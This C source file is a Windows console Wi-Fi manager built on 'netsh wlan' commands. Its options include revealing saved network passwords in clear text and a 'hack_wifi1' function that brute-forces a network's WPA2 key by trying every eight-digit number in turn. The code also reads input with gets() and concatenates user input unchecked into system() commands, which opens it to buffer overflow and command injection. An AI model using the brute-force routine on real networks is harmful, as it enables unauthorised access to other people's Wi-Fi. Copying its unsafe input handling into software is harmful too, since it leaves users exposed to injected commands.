#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<time.h>

void show_connection();
void connect_to_a_network();
void show_available();
void show_interface();
void show_connected_network_password();
void delete_profile();
void hotspot_setting();
void sub_hotspot_setting();
void hack_wifi();
void hack_wifi1();
void sub_print_in_xml();
void sub_print_in_xml1();
void sub_adding_profile();
void sub_connecting_wifi();

void main_program();
void start();
int login();


int main()
{
A:
//    if(0)
    if(!login())
    {
        printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\t\tWrong Information. Press Enter To Enter Login Page......\n");
        getchar();
        system("cls");
        goto A;
    }
    else main_program();
    return 0;
}

void main_program()
{
    start();
    char c[2];
    c[1]=0;
B:
    printf("****************Wi-Fi Interface*****************\n\n");
    printf("E.  EXIT\n");
    printf("C.  Clear Screen\n");
    printf("CC. Connect To A Network\n");
    printf("D.  Disconnect\n");
    printf("DD. Forget A Network\n");
    printf("1.  Show Known Network\n");
    printf("2.  Show Connected Network Interface And Hostpot Status\n");
    printf("3.  Show Connected Network Password\n");
    printf("4.  Show Available Network\n");
    printf("5.  Hotspot Setting\n");
    printf("6.  Connect With A New Network With Password\n");
    printf("7.  Connect With A New Network With Auto Key(WPS only. It will take long time.)\n");
A:
    printf("\nEnter Your Option: ");


    gets(c);

    switch (c[0])
    {
    case '1':
        show_connection();
        goto A;

    case '2':
        show_interface();
        goto A;

    case '4':
        show_available();
        goto A;

    case '3':
        show_connected_network_password();
        goto A;

    case '5':
        system("cls");
        hotspot_setting();
        system("cls");
        goto B;

    case '6':
        system("cls");
        hack_wifi();
        printf("\nPress Enter To Go Back\n");
        getchar();
        system("cls");
        goto B;

    case '7':
        system("cls");
        hack_wifi1();
        printf("\nPress Enter To Go Back\n");
        getchar();
        system("cls");
        goto B;

    case 'E':
        break;

    case 'C':
        if(c[1]=='\0')
        {
            system("cls");
            goto B;
        }
        else if(c[1]=='C')
            connect_to_a_network();
        else
            printf("Wrong Input. Please Read Those Lines Given Above\n");
        goto A;

    case 'D':
        if(c[1]=='\0')
            system("netsh wlan disconnect");
        else if(c[1]=='D')
            delete_profile();
        else
            printf("Wrong Input. Please Read Those Lines Given Above\n");
        goto A;

    default:
        printf("Wrong Input. Please Read Those Lines Given Above\n");
        goto A;
    }
}


void show_connection()
{
    printf("1. Show Known Network\n");
    system("netsh wlan show profile");
}

void show_available()
{
    printf("4. Show Available Network\n");
    system("netsh wlan show network");
}

void show_interface()
{
    printf("2. Show Connected Network Interface\n");
    system("netsh wlan show interface");
}

void start()
{
    int cds, dcs;
    char chds[101]="............................shajedurrahmanpanna.panna@gmail.com.....................................";

    for(cds=0; cds<=100; cds++)
    {
        printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\t\t\t\tStarting Program(%d%%)\n", cds);
        for(dcs=0; dcs<=cds; dcs++)
        {
            printf("%c", chds[dcs]);
        }
        printf("SRP");
        system("cls");
    }
}

//marge
void show_connected_network_password()
{
    int cmrg, dmrg, amrg;
    char chmrg[99];
    char xmrg[999999]="netsh wlan show profiles ";
    char ymrg[]=" key=clear";

    show_connection();

    printf("3. Show Connected Network Password\n");

    printf("Please Enter Connection Name:  ");
    gets(chmrg);

    amrg=strlen(chmrg);
    for(cmrg=25, dmrg=0; dmrg<amrg; cmrg++, dmrg++)
        xmrg[cmrg]=chmrg[dmrg];

    amrg=strlen(ymrg);
    for(dmrg=0; dmrg<amrg; cmrg++, dmrg++)
        xmrg[cmrg]=ymrg[dmrg];


    system(xmrg);
}

void delete_profile()
{
    int adelp, bdelp, ddelp;
    char phdelp[99];
    char chdelp[9999]="netsh wlan delete profile name=";
    show_connection();
    printf("DD. Forget A Network\n");
    printf("Please Enter Connection Name:  ");
    gets(phdelp);

    bdelp=strlen(phdelp);
    adelp=strlen(chdelp);

    for(adelp=strlen(chdelp), ddelp=0; ddelp<bdelp; adelp++, ddelp++)
        chdelp[adelp]=phdelp[ddelp];

    system(chdelp);
}

void connect_to_a_network()
{
    int actan, bctan, dctan;
    char phctan[99];
    char chctan[9999]="netsh wlan connect name=";
    show_connection();
    printf("CC. Connect To A Network\n");
    printf("Please Enter Connection Name:  ");
    gets(phctan);

    bctan=strlen(phctan);
    actan=strlen(chctan);

    for(actan=strlen(chctan), dctan=0; dctan<bctan; actan++, dctan++)
        chctan[actan]=phctan[dctan];

        puts(chctan);

    system(chctan);
}

void hotspot_setting()
{
    char ohs[2];
    char phs[2];
Bhs:
    printf("5.  Hotspot Setting\n\n");
Ahs:
    printf("1. Change Hotspot Name/SSID Or Password\n");
    printf("2. Start Hotspot\n");
    printf("3. Stop Hotspot\n");
    printf("4. Check Hotspot Status\n");
    printf("B. Back\n");
    printf("C. Clear Screen\n");

    printf("\nEnter Your Option: ");
    gets(ohs);

    switch (ohs[0])
    {
    case '1':
        sub_hotspot_setting();
        goto Ahs;

    case '2':
        system("netsh wlan start hostednetwork");
        goto Ahs;

    case '3':
        system("netsh wlan stop hostednetwork");
        goto Ahs;

    case '4':
        system("netsh wlan show hostednetwork");
        goto Ahs;

    case 'B':
        break;

    case 'C':
        system("cls");
        goto Bhs;

    default:
    Phs:
        printf("Wrong Input.\nWnat To Exit From Hotspot Setting? (Press Y/N): ");
        gets(phs);

        if(phs[0]=='Y');
        else if(phs[0]=='N')goto Ahs;
        else goto Phs;
    }
}

void sub_hotspot_setting()
{
    int cshs, dshs, ashs;
    char chshs[99], kshs[99];
    char xshs[999999]="netsh wlan set hostednetwork mode=allow ssid=";
    char yshs[99]=" key=";

    printf("Please Input Hotspot Name/SSID:  ");
    gets(chshs);
Keyshs:
    printf("Input Password (Atleast 8 Digit):  ");
    gets(kshs);

    if(kshs[0]=='\0' || kshs[1]=='\0' || kshs[2]=='\0' || kshs[3]=='\0' || kshs[4]=='\0' || kshs[5]=='\0' || kshs[6]=='\0' || kshs[7]=='\0')
    {
        printf("Password Must Have 8 Digit.\n");
        goto Keyshs;
    }

    ashs=strlen(chshs);
    for(cshs=strlen(xshs), dshs=0; dshs<ashs; cshs++, dshs++)
        xshs[cshs]=chshs[dshs];

    ashs=strlen(yshs);
    for(dshs=0; dshs<ashs; cshs++, dshs++)
        xshs[cshs]=yshs[dshs];

    ashs=strlen(kshs);
    for(dshs=0; dshs<ashs; cshs++, dshs++)
        xshs[cshs]=kshs[dshs];

    system(xshs);

    printf("\n\n\a");
}


void hack_wifi()
{
    char namehw[99], typehw[20], passhw[99];
    char chw[99];
    int dpass;

    show_available();
    printf("6.  Connect With A New Network With Password\n");
    printf("Connection Name: ");
    gets(namehw);

    printf("Enter Password: ");//01712653872
    gets(chw);

    //printf("Connection Type (WEP/WPA/WPA2/WPA2PSK/Or Others): WPA2PSK\n");
    //gets(type);

    strcpy(typehw, "WPA2PSK");
    printf("\n\n");

    //for(dpass=11111111; dpass<=99999999; dpass++)
    {
        printf("Connection Name: %s; Password: %s...", namehw, chw/*dpass*/);
        sub_print_in_xml(namehw, typehw, chw/*dpass*/);
        sub_adding_profile(namehw);
        sub_connecting_wifi(namehw);
        //system("cls");
    }
}

void hack_wifi1()
{
    char namehw[99], typehw[20], passhw[99];
    char chw[99];
    int dpass, test, start, end;

    show_available();
    printf("7.  Connect With A New Network With Password\n");
    printf("Connection Name: ");
    gets(namehw);

    //printf("Enter Password: ");//01712653872
    //gets(chw);

    //printf("Connection Type (WEP/WPA/WPA2/WPA2PSK/Or Others): WPA2PSK\n");
    //gets(type);

    strcpy(typehw, "WPA2PSK");
    printf("\n\n");
    start=clock();

    for(dpass=11111111, test=1; dpass<=99999999; dpass++, test++)
    {
        end=clock();
        printf("(%d)%d. ", end/1000, test);
        printf("Connection Name: %s; Password: %d...", namehw, /*chw*/dpass);
        sub_print_in_xml1(namehw, typehw, /*chw*/dpass);
        sub_adding_profile(namehw);
        sub_connecting_wifi(namehw);
        if(dpass%5==0) system("cls");
    }
}

void sub_print_in_xml(char namehw[], char typehw[], char chw[]/* int dpass*/ )
{
    FILE *Fspix;
    char wispix[]="Wi-Fi-";

    strcat(wispix, namehw);
    strcat(wispix, ".xml");

    Fspix=fopen(wispix, "w");
    fprintf(Fspix, "<?xml version=\"1.0\"?>\n<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n	<name>%s</name>\n	<SSIDConfig>\n		<SSID>\n			<name>%s</name>\n		</SSID>\n	</SSIDConfig>\n	<connectionType>ESS</connectionType>\n	<connectionMode>auto</connectionMode>\n	<MSM>\n		<security>\n			<authEncryption>\n				<authentication>%s</authentication>\n				<encryption>AES</encryption>\n				<useOneX>false</useOneX>\n			</authEncryption>\n			<sharedKey>\n				<keyType>passPhrase</keyType>\n				<protected>false</protected>\n				<keyMaterial>%s</keyMaterial>\n			</sharedKey>\n		</security>\n	</MSM>\n	<MacRandomization xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v3\">\n		<enableRandomization>false</enableRandomization>\n	</MacRandomization>\n</WLANProfile>\n", namehw, namehw, typehw, chw/*dpass*/);
    fclose(Fspix);
}

void sub_print_in_xml1(char namehw[], char typehw[], /*char chw[]*/ int dpass )
{
    FILE *Fspix;
    char wispix[]="Wi-Fi-";

    strcat(wispix, namehw);
    strcat(wispix, ".xml");

    Fspix=fopen(wispix, "w");
    fprintf(Fspix, "<?xml version=\"1.0\"?>\n<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n	<name>%s</name>\n	<SSIDConfig>\n		<SSID>\n			<name>%s</name>\n		</SSID>\n	</SSIDConfig>\n	<connectionType>ESS</connectionType>\n	<connectionMode>auto</connectionMode>\n	<MSM>\n		<security>\n			<authEncryption>\n				<authentication>%s</authentication>\n				<encryption>AES</encryption>\n				<useOneX>false</useOneX>\n			</authEncryption>\n			<sharedKey>\n				<keyType>passPhrase</keyType>\n				<protected>false</protected>\n				<keyMaterial>%d</keyMaterial>\n			</sharedKey>\n		</security>\n	</MSM>\n	<MacRandomization xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v3\">\n		<enableRandomization>false</enableRandomization>\n	</MacRandomization>\n</WLANProfile>\n", namehw, namehw, typehw, /*chw*/dpass);
    fclose(Fspix);
}

void sub_adding_profile(char namehw[])
{
    char wsap[99]="Wi-Fi-";
    char psap[9999]="netsh wlan add profile filename=";

    strcat(wsap, namehw);
    strcat(wsap, ".xml");

    strcat(psap, wsap);
    strcat(psap, " interface=Wi-Fi user=current");

    system(psap);
}

void sub_connecting_wifi(char namehw[])
{
    char fescw[9999]="netsh wlan connect name=";
    strcat(fescw, namehw);
    system(fescw);
}

int login()
{
    int cli, rli=0, lenung=0, lenpwg=0;
    char ungli[999], pwgli[999];
    int unli[]={20,9,2,11,6,5,22,19,19,2,9,14,2,15,17,2,15,15,2,-49,17,2,15,15,2,-31,8,14,2,10,13,-49,4,16,14};
    int pwli[]={96,86,84,91,98,93,30,31,32};

/*    printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\t\tEnter User Name: ");
    gets(ungli); */

    strcpy(ungli, "shajedurrahmanpanna.panna@gmail.com");
    printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\t\tUser Name: %s", ungli);
    getchar();
    system("cls");
    if(strlen(ungli)==35) lenung=1;

    printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\t\tEnter Password: ");
    gets(pwgli);
    system("cls");
    if(strlen(pwgli)==9) lenpwg=1;

    if(lenung==1 && lenpwg==1)
    {
        for(cli=0; cli<35; cli++)
        {
            if(ungli[cli]!=unli[cli]+95)
                return 0;
            else rli=1;
        }
        for(cli=0; cli<9; cli++)
        {
            if(pwgli[cli]!=pwli[cli]+19)
                return 0;
        }
        return rli;
    }
    else return 0;
}
